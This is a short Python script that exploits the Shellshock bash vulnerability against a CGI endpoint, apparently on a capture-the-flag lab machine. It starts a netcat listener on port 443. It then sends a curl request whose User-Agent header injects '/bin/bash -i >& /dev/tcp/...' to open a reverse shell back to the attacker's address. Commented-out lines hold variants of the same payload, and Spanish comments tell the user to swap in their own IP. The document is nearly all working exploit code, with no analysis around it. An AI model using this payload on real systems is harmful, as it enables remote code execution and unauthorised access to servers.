#!/usr/bin/python3

import requests
import subprocess

url = 'http://10.10.10.56/cgi-bin/user.sh'

#user_agent= { "User-Agent" : "() { :; }; /bin/bash >& /dev/tcp/10.10.14.30/443" }	#Modifique su IṔ
#user_agent = {'User-Agent': '() { :; }; ', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}
#requests.post(url, headers=user_agent)


subprocess.call('x-terminal-emulator -e nc -lvp 443 > /dev/null 2>&1 &', shell=True)
subprocess.call("curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.30/443 0>&1' http://10.10.10.56/cgi-bin/user.sh", shell=True) 	#Modifique su ip
